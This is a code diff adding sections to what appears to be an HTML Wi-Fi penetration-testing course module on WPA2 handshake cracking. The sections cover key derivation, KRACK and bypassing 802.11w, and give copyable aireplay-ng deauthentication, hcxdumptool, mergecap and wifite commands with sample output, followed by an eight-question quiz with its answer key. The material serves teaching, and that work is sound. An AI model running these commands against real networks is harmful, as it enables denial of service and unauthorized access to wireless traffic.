@@ -127,6 +127,27 @@
     .nav-btn.prev { border:1px solid var(--border); color:var(--text-dim); }
     .nav-btn.prev:hover { border-color:var(--accent); color:var(--accent); }
 
+    /* Quiz */
+    .quiz-container { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:28px; margin:24px 0; }
+    .quiz-container h3 { font-size:14px; color:var(--accent); margin-bottom:20px; display:flex; align-items:center; gap:8px; }
+    .quiz-question { margin-bottom:28px; }
+    .quiz-question .q-text { font-size:14px; color:var(--text-head); margin-bottom:14px; line-height:1.5; }
+    .quiz-question .q-num { font-family:var(--font-mono); font-size:11px; color:var(--accent); margin-bottom:6px; }
+    .option-list { display:flex; flex-direction:column; gap:8px; }
+    .option-btn { background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:10px 16px; color:var(--text); text-align:left; cursor:pointer; font-size:13px; transition:all 0.15s; font-family:var(--font-body); }
+    .option-btn:hover { border-color:var(--accent); color:var(--text-head); }
+    .option-btn.correct { border-color:var(--accent2); background:rgba(63,185,80,0.08); color:var(--accent2); }
+    .option-btn.wrong { border-color:var(--accent3); background:rgba(247,129,102,0.08); color:var(--accent3); }
+    .option-btn:disabled { cursor:default; }
+    .quiz-feedback { margin-top:10px; font-size:13px; padding:10px 14px; border-radius:6px; display:none; line-height:1.5; }
+    .quiz-feedback.show { display:block; }
+    .quiz-feedback.correct-fb { background:rgba(63,185,80,0.08); border:1px solid rgba(63,185,80,0.3); color:var(--accent2); }
+    .quiz-feedback.wrong-fb { background:rgba(247,129,102,0.08); border:1px solid rgba(247,129,102,0.3); color:var(--accent3); }
+    .quiz-score { display:none; text-align:center; padding:20px; border-top:1px solid var(--border); margin-top:20px; }
+    .quiz-score.show { display:block; }
+    .score-num { font-size:3rem; font-weight:700; color:var(--accent); font-family:var(--font-mono); }
+    .score-label { font-size:14px; color:var(--text-dim); margin-top:4px; }
+
     ::-webkit-scrollbar { width:6px; height:6px; }
     ::-webkit-scrollbar-track { background:var(--bg); }
     ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
@@ -328,6 +349,336 @@
       </div>
     </section>
 
+    <!-- Section 5: Key Derivation -->
+    <section id="keys">
+      <h2><span class="section-num">05</span> Key Derivation — PMK &amp; PTK</h2>
+      <p>Understanding how keys are derived is essential for understanding why capturing the handshake enables offline cracking.</p>
+
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Key</th><th>Derived From</th><th>Purpose</th><th>Cracking Role</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><code>PMK</code></td>
+              <td><code>PBKDF2(HMAC-SHA1, passphrase, SSID, 4096 iters, 256 bits)</code></td>
+              <td>Root key — never transmitted</td>
+              <td>Brute-forced per candidate password</td>
+            </tr>
+            <tr>
+              <td><code>PTK</code></td>
+              <td><code>PRF-512(PMK, "Pairwise key expansion", AP_MAC, STA_MAC, ANonce, SNonce)</code></td>
+              <td>Session encryption key</td>
+              <td>Derived from candidate PMK using captured nonces</td>
+            </tr>
+            <tr>
+              <td><code>KCK</code></td>
+              <td>PTK[0:16] (first 128 bits)</td>
+              <td>Computes EAPOL MIC</td>
+              <td><strong>Used to verify candidate password</strong> — compare against captured MIC</td>
+            </tr>
+            <tr>
+              <td><code>KEK</code></td>
+              <td>PTK[16:32]</td>
+              <td>Encrypts GTK in M3</td>
+              <td>Not needed for cracking</td>
+            </tr>
+            <tr>
+              <td><code>TK</code></td>
+              <td>PTK[32:64]</td>
+              <td>AES-CCMP data encryption</td>
+              <td>Recovered after cracking → decrypt traffic</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="callout attack">
+        <span class="ci">&#9889;</span>
+        <div><strong>The cracking loop:</strong> For each candidate password → derive PMK → derive PTK → extract KCK → compute MIC → compare with captured MIC. If they match: password found. This runs entirely offline — no AP interaction needed after capture. CPU: ~650 candidates/sec. GPU (RTX 4090): ~1.9 million/sec.</div>
+      </div>
+    </section>
+
+    <!-- Section 6: Full Command Reference -->
+    <section id="full-cmds">
+      <h2><span class="section-num">06</span> Full Command Reference</h2>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">aireplay-ng --deauth — all flags explained</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-deauth-full')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-deauth-full"><span class="cmt"># Broadcast deauth (kicks ALL clients)</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo aireplay-ng <span class="flag">--deauth</span> <span class="str">5</span> <span class="flag">-a</span> <span class="str">AA:BB:CC:DD:EE:FF</span> wlan0mon</span>
+<span class="cmt"># --deauth 5 / -0 5  → send 5 deauth frames then stop (use 0 for infinite)</span>
+<span class="cmt"># -a <BSSID>          → AP BSSID used as spoofed source MAC of the deauth</span>
+
+<span class="cmt"># Targeted deauth (single client — more precise)</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo aireplay-ng <span class="flag">--deauth</span> <span class="str">5</span> <span class="flag">-a</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-c</span> <span class="str">11:22:33:44:55:66</span> wlan0mon</span>
+<span class="cmt"># -c <MAC>            → target this specific client (omit for broadcast)</span>
+
+<span class="cmt"># Fix "Fixed channel wlan0mon: -1" channel mismatch error</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo aireplay-ng <span class="flag">--deauth</span> <span class="str">5</span> <span class="flag">-a</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">--ignore-negative-one</span> wlan0mon</span>
+<span class="cmt"># --ignore-negative-one → ignore channel -1 error (forces injection anyway)</span></div>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">hcxdumptool v6+ correct flags</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-hcx-full')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-hcx-full"><span class="cmt"># Basic capture (--enable_status=1 is REQUIRED in v6+)</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo hcxdumptool <span class="flag">-i</span> wlan0mon <span class="flag">-o</span> <span class="str">capture.pcapng</span> <span class="flag">--enable_status=1</span></span>
+<span class="cmt"># -i wlan0mon         → monitor mode interface</span>
+<span class="cmt"># -o capture.pcapng   → output (MUST be .pcapng, not .cap)</span>
+<span class="cmt"># --enable_status=1   → required v6+ (1=minimal, 3=verbose, without it: silent exit)</span>
+
+<span class="cmt"># Target specific AP only</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">echo <span class="str">"AA:BB:CC:DD:EE:FF"</span> > target.txt && sudo hcxdumptool <span class="flag">-i</span> wlan0mon <span class="flag">-o</span> <span class="str">capture.pcapng</span> <span class="flag">--enable_status=1</span> <span class="flag">--filtermode=1</span> <span class="flag">--filterlist_ap=target.txt</span></span>
+<span class="cmt"># --filtermode=1       → only capture APs in filterlist</span>
+<span class="cmt"># --filtermode=2       → capture ALL except listed (exclusion mode)</span>
+<span class="cmt"># --filterlist_ap=file → file with one BSSID per line</span>
+
+<span class="cmt"># Check what was captured</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">hcxpcapngtool <span class="flag">--info</span> capture.pcapng</span>
+<span class="out-ok">M1M2 pairs: 1    M1M2M3M4 pairs: 0    PMKIDs: 3</span>
+
+<span class="cmt"># Convert to hashcat -m 22000 format</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">hcxpcapngtool <span class="flag">-o</span> <span class="str">hashes.hc22000</span> capture.pcapng</span>
+<span class="out-ok">1 hash written to hashes.hc22000</span></div>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">Partial handshake recovery — mergecap</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-merge')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-merge"><span class="cmt"># Check which EAPOL messages you have</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">tshark <span class="flag">-r</span> capture-01.cap <span class="flag">-Y</span> <span class="str">"eapol"</span> <span class="flag">-T</span> fields <span class="flag">-e</span> eapol.keydes.msgnr | sort | uniq -c</span>
+<span class="out">   1 1    ← M1 captured</span>
+<span class="out">   1 2    ← M2 captured  → M1+M2 = CRACKABLE</span>
+
+<span class="cmt"># Merge multiple partial capture files into one</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">mergecap <span class="flag">-a</span> <span class="flag">-F</span> pcap <span class="flag">-w</span> <span class="str">merged.cap</span> capture-01.cap capture-02.cap capture-03.cap</span>
+<span class="cmt"># -a = append in chronological order</span>
+<span class="cmt"># -F pcap = output format (Wireshark suite tool)</span>
+<span class="cmt"># Useful when multiple deauths each captured different EAPOL messages</span>
+
+<span class="cmt"># Verify merged capture</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">aircrack-ng merged.cap</span>
+<span class="out-ok">1  AA:BB:CC:DD:EE:FF  MyNetwork    WPA2 (2) handshake</span></div>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">wifite — automated handshake capture</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-wifite')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-wifite"><span class="cmt"># Automated WPA2 attack: scan → select → deauth → capture → verify</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo wifite <span class="flag">--wpa</span> <span class="flag">--kill</span></span>
+<span class="cmt"># --wpa    → only attack WPA/WPA2 (skip WEP)</span>
+<span class="cmt"># --kill   → kill interfering processes before starting</span>
+
+<span class="cmt"># Target specific AP and attempt crack with rockyou.txt</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo wifite <span class="flag">--bssid</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">--dict</span> <span class="str">/usr/share/wordlists/rockyou.txt</span></span>
+<span class="cmt"># --bssid  → target this AP only</span>
+<span class="cmt"># --dict   → attempt crack after capture with this wordlist</span>
+<span class="cmt"># --pmkid  → use PMKID attack instead of handshake (no deauth needed)</span>
+<span class="cmt"># Captures saved to: ./cracked/ directory</span></div>
+      </div>
+    </section>
+
+    <!-- Section 7: KRACK -->
+    <section id="krack">
+      <h2><span class="section-num">07</span> KRACK — Key Reinstallation Attack</h2>
+      <p>
+        KRACK (CVE-2017-13077) is a critical vulnerability in the WPA2 4-way handshake <strong>state machine</strong>.
+        It does not break AES-CCMP — it forces nonce reuse by replaying Message 3.
+      </p>
+
+      <div class="callout attack">
+        <span class="ci">&#9888;</span>
+        <div><strong>CVE-2017-13077:</strong> By blocking the client's M4 ACK and replaying M3, an attacker forces the client to reinstall the PTK — resetting the CCMP Packet Number (PN) to 0. With the same nonce, AES-CTR generates the same keystream twice → XOR two ciphertexts = XOR of plaintexts → plaintext recovery.</div>
+      </div>
+
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>CVE</th><th>Target</th><th>Impact</th></tr></thead>
+          <tbody>
+            <tr><td><code>CVE-2017-13077</code></td><td>PTK (4-way M3 replay)</td><td>Nonce reuse in unicast data encryption</td></tr>
+            <tr><td><code>CVE-2017-13078</code></td><td>GTK (group key)</td><td>Nonce reuse in multicast/broadcast decryption</td></tr>
+            <tr><td><code>CVE-2017-13079</code></td><td>IGTK (802.11w)</td><td>Nonce reuse in protected management frames</td></tr>
+            <tr><td><code>CVE-2017-13086</code></td><td>PeerKey HS</td><td>Direct peer-to-peer link nonce reuse</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="callout info">
+        <span class="ci">&#128161;</span>
+        <div><strong>Patch status:</strong> All major OS vendors patched KRACK by late 2017. However, many embedded IoT devices, industrial controllers, and older routers remain unpatched. In real engagements, always check for unpatched embedded devices.</div>
+      </div>
+    </section>
+
+    <!-- Section 8: PMF / 802.11w -->
+    <section id="pmf">
+      <h2><span class="section-num">08</span> 802.11w (PMF) — When Deauth Is Blocked</h2>
+      <p>
+        When <strong>Management Frame Protection (802.11w / PMF)</strong> is required on the AP,
+        forged deauth frames are rejected by the client. WPA3 mandates PMF; WPA2 can optionally enable it.
+      </p>
+
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>PMF Status</th><th>Effect on Deauth Attack</th><th>Workaround</th></tr></thead>
+          <tbody>
+            <tr><td>Disabled</td><td style="color:var(--accent2)">Deauth works normally</td><td>—</td></tr>
+            <tr><td>Capable (optional)</td><td style="color:var(--warn)">Deauth works pre-association only</td><td>Send deauth immediately on first client probe</td></tr>
+            <tr><td style="color:var(--accent3)">Required (mandatory)</td><td style="color:var(--accent3)">Forged deauth rejected by client</td><td>PMKID attack (Module 12), Evil Twin (Module 09), Channel-switch flood</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">Detect PMF on target AP</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-pmf')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-pmf"><span class="cmt"># Check beacon RSN capabilities for MFP flags</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">tshark <span class="flag">-r</span> capture.pcapng <span class="flag">-Y</span> <span class="str">"wlan.fc.type_subtype==8 &amp;&amp; wlan.bssid==aa:bb:cc:dd:ee:ff"</span> <span class="flag">-T</span> fields <span class="flag">-e</span> wlan_mgt.rsn.capabilities.mfpr <span class="flag">-e</span> wlan_mgt.rsn.capabilities.mfpc</span>
+<span class="out">mfpr  mfpc</span>
+<span class="out-ok">0     0    ← PMF disabled = deauth works</span>
+<span class="out-warn">0     1    ← PMF capable = deauth works pre-assoc only</span>
+<span class="out-err">1     1    ← PMF required = forged deauth rejected</span>
+
+<span class="cmt"># If PMF required → use PMKID attack instead (no deauth needed)</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo hcxdumptool <span class="flag">-i</span> wlan0mon <span class="flag">-o</span> <span class="str">pmkid.pcapng</span> <span class="flag">--enable_status=1</span></span>
+<span class="cmt"># PMKID is extracted passively from Association Responses — no deauth needed</span>
+<span class="cmt"># See Module 12 for full PMKID attack workflow</span></div>
+      </div>
+    </section>
+
+    <!-- Section 9: Quiz -->
+    <section id="quiz">
+      <h2><span class="section-num">09</span> Knowledge Check</h2>
+
+      <div class="quiz-container">
+        <h3>&#127358; Module 06 Quiz &nbsp;<span style="font-size:11px;color:var(--text-dim);font-weight:400">8 questions</span></h3>
+
+        <!-- Q1 -->
+        <div class="quiz-question" id="q1">
+          <div class="q-num">Question 1 of 8</div>
+          <div class="q-text">Why are both the passphrase AND the SSID inputs to the WPA2 PMK derivation function?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q1',false)">To double the key length from 128 to 256 bits</button>
+            <button class="option-btn" onclick="answer(this,'q1',true)">The SSID acts as a per-network salt — making precomputed rainbow tables SSID-specific. A table built for "linksys" cannot crack "HomeNet" because the PMK values differ.</button>
+            <button class="option-btn" onclick="answer(this,'q1',false)">The SSID provides entropy so the passphrase only needs 8 characters</button>
+            <button class="option-btn" onclick="answer(this,'q1',false)">To comply with the 802.11i specification for SHA-256 hashing</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q1"></div>
+        </div>
+
+        <!-- Q2 -->
+        <div class="quiz-question" id="q2">
+          <div class="q-num">Question 2 of 8</div>
+          <div class="q-text">What are the three sub-keys that the PTK splits into, and which one is used during the cracking verification step?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q2',false)">ANonce, SNonce, GTK — the SNonce verifies the password</button>
+            <button class="option-btn" onclick="answer(this,'q2',true)">KCK (Key Confirmation Key), KEK (Key Encryption Key), TK (Temporal Key) — the KCK is used to compute the MIC that verifies the candidate password</button>
+            <button class="option-btn" onclick="answer(this,'q2',false)">PMK, GTK, IVK — the PMK verifies the handshake</button>
+            <button class="option-btn" onclick="answer(this,'q2',false)">TK, MIC, IV — the MIC directly contains the password hash</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q2"></div>
+        </div>
+
+        <!-- Q3 -->
+        <div class="quiz-question" id="q3">
+          <div class="q-num">Question 3 of 8</div>
+          <div class="q-text"><code>aircrack-ng handshake.cap</code> shows <code>WPA (0) handshake</code> for your target AP. What does this mean?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q3',false)">The network uses WPA1 which has 0 vulnerabilities</button>
+            <button class="option-btn" onclick="answer(this,'q3',true)">No EAPOL exchange was captured — the capture contains no usable handshake data. You need to recapture after ensuring the deauth was sent while airodump-ng was running.</button>
+            <button class="option-btn" onclick="answer(this,'q3',false)">The capture is corrupt and needs to be re-downloaded</button>
+            <button class="option-btn" onclick="answer(this,'q3',false)">The passphrase starts with "0" — aircrack-ng skipped it</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q3"></div>
+        </div>
+
+        <!-- Q4 -->
+        <div class="quiz-question" id="q4">
+          <div class="q-num">Question 4 of 8</div>
+          <div class="q-text">You run <code>sudo hcxdumptool -i wlan0mon -o capture.pcapng</code> and the command exits immediately with no output. What is the most likely cause?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q4',false)">The output file already exists and cannot be overwritten</button>
+            <button class="option-btn" onclick="answer(this,'q4',true)">hcxdumptool v6+ requires <code>--enable_status=1</code> flag — without it the tool exits silently</button>
+            <button class="option-btn" onclick="answer(this,'q4',false)">The interface must be named "wlan0" not "wlan0mon"</button>
+            <button class="option-btn" onclick="answer(this,'q4',false)">hcxdumptool requires root but you already ran it as root</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q4"></div>
+        </div>
+
+        <!-- Q5 -->
+        <div class="quiz-question" id="q5">
+          <div class="q-num">Question 5 of 8</div>
+          <div class="q-text">What does the KRACK attack (CVE-2017-13077) exploit and what is the result?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q5',false)">It exploits a weak passphrase to derive the PMK from the beacon SSID</button>
+            <button class="option-btn" onclick="answer(this,'q5',false)">It decrypts AES-CCMP by exploiting a mathematical weakness in the cipher itself</button>
+            <button class="option-btn" onclick="answer(this,'q5',true)">It replays EAPOL Message 3 to force the client to reinstall the PTK with a reset nonce, causing CCMP nonce reuse — XORing two ciphertexts recovers plaintext</button>
+            <button class="option-btn" onclick="answer(this,'q5',false)">It captures the PMK by intercepting the AP's RADIUS server response</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q5"></div>
+        </div>
+
+        <!-- Q6 -->
+        <div class="quiz-question" id="q6">
+          <div class="q-num">Question 6 of 8</div>
+          <div class="q-text">The target AP has PMF Required (mfpr=1, mfpc=1). Your deauth frames are being ignored. What is the best alternative capture method?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q6',false)">Increase the deauth count to 1000 — eventually the client will disconnect</button>
+            <button class="option-btn" onclick="answer(this,'q6',false)">Switch to the Cafe Latte attack — it bypasses PMF</button>
+            <button class="option-btn" onclick="answer(this,'q6',true)">Use the PMKID attack (hcxdumptool) — extracts the PMKID passively from Association Responses without sending any deauth frames</button>
+            <button class="option-btn" onclick="answer(this,'q6',false)">Downgrade the AP to WPA1 by sending a forged beacon</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q6"></div>
+        </div>
+
+        <!-- Q7 -->
+        <div class="quiz-question" id="q7">
+          <div class="q-num">Question 7 of 8</div>
+          <div class="q-text">You have two partial captures: one with EAPOL M1 only, another with EAPOL M3+M4. Can you crack this handshake, and why?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q7',false)">No — you need all four messages in one file</button>
+            <button class="option-btn" onclick="answer(this,'q7',true)">Yes — merge them with <code>mergecap</code>. M1 provides ANonce, M3 also contains ANonce and a MIC. Combined with M4's SNonce context, aircrack-ng/hashcat may succeed with M1+M3.</button>
+            <button class="option-btn" onclick="answer(this,'q7',false)">No — M2 is the only message containing the SNonce needed for cracking</button>
+            <button class="option-btn" onclick="answer(this,'q7',false)">Only if the AP uses TKIP, not CCMP</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q7"></div>
+        </div>
+
+        <!-- Q8 -->
+        <div class="quiz-question" id="q8">
+          <div class="q-num">Question 8 of 8</div>
+          <div class="q-text">What is the difference between sending <code>--deauth 0</code> and <code>--deauth 5</code> in aireplay-ng?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q8',false)">--deauth 0 sends 0 frames (dry run); --deauth 5 sends exactly 5</button>
+            <button class="option-btn" onclick="answer(this,'q8',true)">--deauth 0 sends deauth frames in an infinite loop (must Ctrl+C to stop — acts as a DoS); --deauth 5 sends exactly 5 frames and stops</button>
+            <button class="option-btn" onclick="answer(this,'q8',false)">--deauth 0 targets the AP; --deauth 5 targets up to 5 clients</button>
+            <button class="option-btn" onclick="answer(this,'q8',false)">--deauth 0 uses broadcast; --deauth 5 uses unicast targeting</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q8"></div>
+        </div>
+
+        <div class="quiz-score" id="quizScore">
+          <div class="score-num" id="scoreNum">0/8</div>
+          <div class="score-label" id="scoreLabel"></div>
+        </div>
+      </div>
+    </section>
+
     <!-- Nav -->
     <div class="nav-footer">
       <a href="../module-05-wep-cracking/" class="nav-btn prev">&#8592; Module 05: WEP Cracking</a>
@@ -346,6 +697,78 @@
       btn.classList.add('copied');
       setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
     });
+  }
+
+  // ── Quiz ──────────────────────────────────────────────────────
+  const TOTAL_Q = 8;
+  const qAnswered = {};
+  const qFeedbacks = {
+    q1: {
+      correct: "Correct. The SSID is a per-network salt in PBKDF2. PMK = PBKDF2(HMAC-SHA1, passphrase, SSID, 4096). Changing the SSID completely changes the PMK output for the same passphrase. A precomputed table for 'linksys' is completely useless against 'HomeNet42'.",
+      wrong: "Incorrect. The SSID functions as a per-network salt in PBKDF2-SHA1. Same passphrase + different SSID = completely different PMK. This prevents precomputed rainbow tables from working across different networks."
+    },
+    q2: {
+      correct: "Correct. PTK = KCK (128 bits) + KEK (128 bits) + TK (256 bits). The KCK is used to compute HMAC-SHA1 over the EAPOL frame body to produce the MIC. During cracking, aircrack-ng/hashcat derive a candidate KCK and verify it produces the same MIC as captured in M2.",
+      wrong: "Incorrect. The PTK splits into: KCK (Key Confirmation Key) → computes MIC; KEK (Key Encryption Key) → encrypts GTK in M3; TK (Temporal Key) → AES-CCMP data encryption. Cracking verifies the KCK by recomputing the MIC."
+    },
+    q3: {
+      correct: "Correct. 'WPA (0) handshake' means zero EAPOL exchanges were captured. Either the deauth was sent before airodump-ng started, you were on the wrong channel, or the client reconnected too fast. Start the capture FIRST, then send deauth.",
+      wrong: "Incorrect. The '(N) handshake' number in aircrack-ng output is the count of captured handshakes. (0) means zero — no EAPOL exchange captured at all. Ensure airodump-ng is running and on the right channel before sending deauth."
+    },
+    q4: {
+      correct: "Correct. hcxdumptool v6 changed the API — it requires --enable_status=1 (or 2 or 3) to show output. Without this flag, the tool checks permissions, then exits silently. Add --enable_status=1 to any hcxdumptool command.",
+      wrong: "Incorrect. hcxdumptool v6+ requires --enable_status=1. Without this flag, the tool performs its initialization checks and then exits silently with no error message — it looks like it ran successfully but captured nothing."
+    },
+    q5: {
+      correct: "Correct. KRACK forces M3 retransmission by blocking M4. The client reinstalls the PTK with PN=0. Since the same nonce feeds AES-CTR mode twice, the same keystream K is generated. C1 XOR C2 = (P1 XOR K) XOR (P2 XOR K) = P1 XOR P2 → with known plaintext, recover P2.",
+      wrong: "Incorrect. KRACK (CVE-2017-13077) exploits the 4-way handshake retransmission mechanism. Replaying M3 causes PTK reinstallation with nonce reset. This causes CCMP nonce reuse — not an AES weakness, but a protocol state machine flaw."
+    },
+    q6: {
+      correct: "Correct. With PMF Required, the client has a session PTK and uses it to verify deauth MICs — forged deauths without a valid MIC are discarded. The PMKID attack (Module 12) extracts the PMKID from the AP's Association Response — completely passive, no deauth needed.",
+      wrong: "Incorrect. PMF Required means ALL deauth/disassoc frames must be MIC'd with the current PTK. Forged frames are rejected. The PMKID attack is the correct bypass — it extracts a crackable value from the AP's EAPOL RSNIE without any client interaction."
+    },
+    q7: {
+      correct: "Correct. M1 contains the ANonce. M3 also contains the ANonce plus a verifiable MIC. After merging with mergecap, aircrack-ng can often use M1+M3 as an alternative to M1+M2. M3's MIC uses the same KCK as M2's MIC, giving aircrack-ng another verification point.",
+      wrong: "Incorrect. You can attempt cracking with M1+M3. M3 contains the ANonce (same as M1 provides) and a MIC computed with the KCK. Merge the files with 'mergecap -a -F pcap -w merged.cap cap1.cap cap2.cap' and retry aircrack-ng."
+    },
+    q8: {
+      correct: "Correct. --deauth 0 (or -0 0) sends deauth frames in an infinite loop until you press Ctrl+C — this is a continuous denial-of-service attack. --deauth 5 sends exactly 5 deauth frames and stops. In real engagements, always use a specific count (5-10) to minimize client disruption.",
+      wrong: "Incorrect. The number after --deauth specifies the count. 0 = infinite loop (runs forever → DoS). 5 = sends exactly 5 frames and stops. In authorized engagements use 5-10, never 0 unless you intend to DoS the network."
+    }
+  };
+
+  let qScore = 0;
+  let qCount = 0;
+
+  function answer(btn, qId, isCorrect) {
+    if (qAnswered[qId]) return;
+    qAnswered[qId] = true;
+    qCount++;
+    const qEl = document.getElementById(qId);
+    const buttons = qEl.querySelectorAll('.option-btn');
+    buttons.forEach(b => b.disabled = true);
+    const fb = document.getElementById('fb-' + qId);
+    if (isCorrect) {
+      btn.classList.add('correct');
+      qScore++;
+      fb.textContent = '✓ ' + qFeedbacks[qId].correct;
+      fb.className = 'quiz-feedback correct-fb show';
+    } else {
+      btn.classList.add('wrong');
+      fb.textContent = '✗ ' + qFeedbacks[qId].wrong;
+      fb.className = 'quiz-feedback wrong-fb show';
+      buttons.forEach(b => { if (b.onclick && b.onclick.toString().includes('true')) b.classList.add('correct'); });
+    }
+    if (qCount === TOTAL_Q) {
+      const scoreEl = document.getElementById('quizScore');
+      const numEl = document.getElementById('scoreNum');
+      const labelEl = document.getElementById('scoreLabel');
+      numEl.textContent = qScore + '/' + TOTAL_Q;
+      const pct = qScore / TOTAL_Q;
+      labelEl.textContent = pct === 1 ? 'Perfect — ready for Module 07!' : pct >= 0.75 ? 'Strong — review the missed questions.' : pct >= 0.5 ? 'Getting there — re-read the key derivation and KRACK sections.' : 'Re-read the PTK derivation, hcxdumptool, and KRACK sections.';
+      numEl.style.color = pct === 1 ? 'var(--accent2)' : pct >= 0.625 ? 'var(--warn)' : 'var(--accent3)';
+      scoreEl.classList.add('show');
+    }
   }
 
   // Capture simulation
